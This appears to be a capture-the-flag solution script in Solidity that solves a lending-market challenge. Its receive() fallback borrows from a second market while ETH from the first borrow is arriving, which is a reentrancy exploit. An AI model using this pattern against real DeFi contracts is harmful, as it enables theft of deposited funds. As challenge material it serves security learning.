// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Challenge} from "../src/Challenge.sol";
import "../src/interface.sol";

contract Solve {
    Challenge chal;
    IMarketETH public marketETH;
    IMarketToken public marketToken;

    function solve(address _chal) public payable {
        chal = Challenge(_chal);
        marketETH = IMarketETH(address(chal.marketETH()));
        marketToken = IMarketToken(address(chal.marketToken()));

        marketETH.deposit{value: 1 ether}();
        marketETH.borrow(1 ether);
        require(chal.isSolved(), "!solved");
    }

    receive() external payable {
        if(msg.value > 0) {
            marketToken.borrow(msg.value);
        }
    } 
}